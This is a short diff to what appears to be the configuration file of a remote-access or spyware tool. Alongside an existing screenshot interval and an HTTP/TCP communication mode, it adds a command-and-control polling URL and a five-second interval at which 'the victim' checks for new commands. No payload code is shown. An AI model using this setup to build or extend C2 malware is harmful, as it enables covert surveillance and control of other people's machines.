@@ -30,3 +30,9 @@ SCREENSHOT_INTERVAL = 15
 # Active communication mode on startup. Used for resilience and potential switch_mode commands.
 # Possible values: "http" or "tcp"
 INITIAL_COMM_MODE = "http"
+
+# --- CONFIGURATION OF C2 COMMAND POLLING  ---
+# Base URL for API de commande of C2 (ex: "http://192.168.56.101:5000/command")
+C2_COMMAND_URL = "http://127.0.0.1:5000/command" 
+# Frequency of the victim requesting the C2 for new commands (in secondes)
+COMMAND_CHECK_INTERVAL = 5
